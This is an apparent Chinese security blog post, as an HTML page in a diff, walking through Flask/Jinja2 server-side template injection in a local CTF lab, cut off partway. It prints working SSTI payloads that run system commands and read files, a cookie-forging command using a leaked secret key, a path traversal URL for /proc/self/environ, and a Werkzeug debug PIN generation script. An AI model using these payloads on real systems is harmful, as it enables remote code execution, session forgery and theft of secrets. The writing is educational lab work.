@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Flask SSTI 利用方式探索 - Geekby&#39;s Blog</title><meta name="Description" content="Flask SSTI 利用方式探索"><meta property="og:title" content="Flask SSTI 利用方式探索" />
+<meta property="og:description" content="Flask SSTI 利用方式探索" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-06-22T16:05:00+08:00" />
+<meta property="article:modified_time" content="2020-06-22T16:05:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Flask SSTI 利用方式探索"/>
+<meta name="twitter:description" content="Flask SSTI 利用方式探索"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/" /><link rel="prev" href="https://www.geekby.site/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" /><link rel="next" href="https://www.geekby.site/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Flask SSTI 利用方式探索",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2020\/06\/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试, SSTI","wordcount":  364 ,
+        "url": "https:\/\/www.geekby.site\/2020\/06\/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2\/","datePublished": "2020-06-22T16:05:00+08:00","dateModified": "2020-06-22T16:05:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "Flask SSTI 利用方式探索"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Flask SSTI 利用方式探索</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-06-22">2020-06-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 364 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#python-语言基础">python 语言基础</a></li>
+    <li><a href="#ssti-简介--环境搭建">SSTI 简介 &amp; 环境搭建</a>
+      <ul>
+        <li><a href="#模板">模板</a></li>
+        <li><a href="#ssti">SSTI</a></li>
+        <li><a href="#环境搭建">环境搭建</a></li>
+      </ul>
+    </li>
+    <li><a href="#敏感信息泄露导致身份伪造">敏感信息泄露导致身份伪造</a>
+      <ul>
+        <li><a href="#flask-session-机制">flask session 机制</a></li>
+        <li><a href="#方法一">方法一</a></li>
+        <li><a href="#方法二">方法二</a></li>
+      </ul>
+    </li>
+    <li><a href="#flask-pin-码利用">Flask PIN 码利用</a>
+      <ul>
+        <li><a href="#flask-pin-码">Flask PIN 码</a>
+          <ul>
+            <li><a href="#脚本中-6-个参数的获取方法">脚本中 6 个参数的获取方法：</a>
+              <ul>
+                <li><a href="#username">username</a></li>
+                <li><a href="#modname">modname</a></li>
+                <li><a href="#app-name">app name</a></li>
+                <li><a href="#路径">路径</a></li>
+                <li><a href="#网络地址">网络地址</a></li>
+                <li><a href="#机器码">机器码</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#执行脚本">执行脚本</a></li>
+      </ul>
+    </li>
+    <li><a href="#ssti-导致-rce">SSTI 导致 RCE</a>
+      <ul>
+        <li><a href="#代码执行">代码执行</a></li>
+        <li><a href="#python-魔法函数--内置函数">python 魔法函数 + 内置函数</a>
+          <ul>
+            <li><a href="#魔法函数">魔法函数</a></li>
+            <li><a href="#内置函数">内置函数</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="flask-ssti-利用方式探索">Flask SSTI 利用方式探索</h1>
+<h2 id="python-语言基础">python 语言基础</h2>
+<p>在 python 中，object 类是 Python 中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承 object 类。 每个类都有的魔术变量 <code>__class__</code>，表示当前类。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212452.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212452.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212452.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212452.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212452.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212452.png-water_print" /></p>
+<p>每个类都有一个 <code>__base__</code> 属性，列出其基类：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212639.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212639.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212639.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212639.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212639.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212639.png-water_print" /></p>
+<p>列出所有基类：<code>__bases__</code></p>
+<p>列举类的调用顺序：<code>__mro__</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212935.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212935.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212935.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212935.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212935.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210311212935.png-water_print" /></p>
+<p>获取子类集合：<code>''.__class__.__mro__[1].__subclasses__()</code></p>
+<p>接下来寻找可以执行命令的子类：<code>os._wrap_close(133)</code></p>
+<p>查找可使用的变量和方法：<code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__</code></p>
+<p>执行系统命令：<code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('ls').read()</code></p>
+<p>读取文件内容：<code>&quot;&quot;.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__[&quot;__builtins__&quot;][&quot;open&quot;](&quot;flag.txt&quot;).read()</code></p>
+<h2 id="ssti-简介--环境搭建">SSTI 简介 &amp; 环境搭建</h2>
+<h3 id="模板">模板</h3>
+<p>一个统一风格的站点，其大多数页面样式都是一致的，只是每个页面显示的内容各不相同。要是所有的逻辑都放在前端进行，无疑会影响响应效果和效率，很不现实。把所有的逻辑放在后端，又会导致太过复杂，前轻后重</p>
+<p>模板的诞生是为了将显示与数据分离，让前端工作人员专注表现设计，后台人员注重业务逻辑，同时简化代码的复杂程度。模板技术多种多样，但其本质是将模板文件和数据通过模板引擎生成最终的HTML代码。</p>
+<p><code>Flask</code> 使用 <code>Jinja2</code> 作为模板引擎，<code>Jinja</code> 的语法很简单，大致有这么几种：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{%...%} 语句 (Statements)
+{{...}} 打印模板输出的表达式 (Expressions)
+{{#...#}} 注释
+#...## 行注释 (Line Statements)
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="ssti">SSTI</h3>
+<blockquote>
+<p>在 SSTI 漏洞点中，{{x}} 里面的内容会被执行。</p>
+</blockquote>
+<p>SSTI，又称<code>服务端模板注入攻击</code>。jinja2 模板中使用 <code>{}</code> 语法表示一个变量，它是一种特殊的占位符。当利用 jinja2 进行渲染的时候，它会把这些特殊的占位符进行填充/替换。但是在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了<code>敏感信息泄露</code>、<code>代码执行</code>、 <code>GetShell</code> 等问题</p>
+<h3 id="环境搭建">环境搭建</h3>
+<p>测试环境搭建：Ubuntu + Docker</p>
+<p>环境：</p>
+<p><a href="https://github.com/Tiaonmmn/pasecactf_2019_web_honey_shop" target="_blank" rel="noopener noreffer">https://github.com/Tiaonmmn/pasecactf_2019_web_honey_shop</a></p>
+<h2 id="敏感信息泄露导致身份伪造">敏感信息泄露导致身份伪造</h2>
+<h3 id="flask-session-机制">flask session 机制</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622114302.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622114302.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622114302.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622114302.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622114302.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622114302.png-water_print" /></p>
+<p>通过<code>.</code>隔开的 3 段内容，第一段其实就是 base64encode 后的内容，但去掉了填充用的等号，若 decode 失败，自己需要补上 1-3 个等号补全。中间内容为时间戳，在 flask 中时间戳若超过 31 天则视为无效。最后一段则是安全签名，将 <code>session data</code>，<code>时间戳</code>和 <code>flask</code> 的 <code>secretkey</code> 通过 <code>sha1</code> 运算的结果。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622142923.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622142923.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622142923.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622142923.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622142923.png-water_print"
+        title="demo 中的 session 1" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622143031.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622143031.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622143031.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622143031.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622143031.png-water_print"
+        title="demo 中的 session 2" /></p>
+<h3 id="方法一">方法一</h3>
+<p>该应用在 <code>/hello</code> 下存在 <code>SSTI</code> 漏洞:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144155.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144155.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144155.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144155.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144155.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144155.png-water_print" /></p>
+<p><code>config</code> 下泄露了 <code>SECRET_KEY</code>：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144201.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144201.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144201.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144201.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144201.png-water_print"
+        title="SECRET_KEY" /></p>
+<p>使用 <code>flask-unsign</code> 工具（使用 <code>pip</code> 安装）伪造 Cookie：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">flask-unsign --sign --cookie <span class="s2">&#34;{&#39;balance&#39;: 6666}&#34;</span> --secret <span class="s2">&#34;7xrQRfVWmTHMRzwGXLhCQrECTqLndq1ODnvvDjKZ&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145634.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145634.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145634.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145634.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145634.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145634.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145651.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145651.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145651.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145651.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145651.png-water_print"
+        title="导入Cookie" /></p>
+<h3 id="方法二">方法二</h3>
+<p><code>http://127.0.0.1:8345/download?image=1.jpg</code> 存在任意文件下载漏洞，下载环境变量文件：</p>
+<p><code>http://127.0.0.1:8345/download?image=../../../../../../../../../proc/self/environ</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622150508.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622150508.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622150508.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622150508.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622150508.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622150508.png-water_print" /></p>
+<h2 id="flask-pin-码利用">Flask PIN 码利用</h2>
+<h3 id="flask-pin-码">Flask PIN 码</h3>
+<p>Flask Debug 应用在模式下提供的一种页面端的交互调试工具，和我们平时使用的 Python 命令行是一样的，也就是给我们提供了一个交互式的 web 端 shell。但是 PIN 码的生成规则是有规律可循的，使得获取 PIN 码成为可能，之后能够利用的方式有很多。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;root&#39;</span><span class="p">,</span><span class="c1"># username</span>
+    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># modname</span>
+    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span><span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
+    <span class="s1">&#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39;</span> <span class="c1"># getattr(mod, &#39;__file__&#39;, None),</span>
+<span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;345051575547&#39;</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/eth0/address</span>
+    <span class="s1">&#39;613cacd3857f425e9409e544dece08da&#39;</span><span class="p">,</span> <span class="c1"># get_machine_id(), /etc/machine-id</span>
+<span class="p">]</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
+
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span><span class="kc">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="脚本中-6-个参数的获取方法">脚本中 6 个参数的获取方法：</h4>
+<h5 id="username">username</h5>
+<p>运行 flask 的用户，之前读取 <code>/etc/passwd</code> 获取</p>
+<h5 id="modname">modname</h5>
+<p>一般默认即可</p>
+<h5 id="app-name">app name</h5>
+<p>一般默认即可</p>
+<h5 id="路径">路径</h5>
+<p>debug 下报错</p>
+<h5 id="网络地址">网络地址</h5>
+<p>读取：<code>/sys/class/net/eth0/address</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nb">int</span><span class="p">(</span><span class="s2">&#34;02:42:ac:13:00:02&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152622.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152622.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152622.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152622.png-water_print 2x"
+        data-sizes="auto"
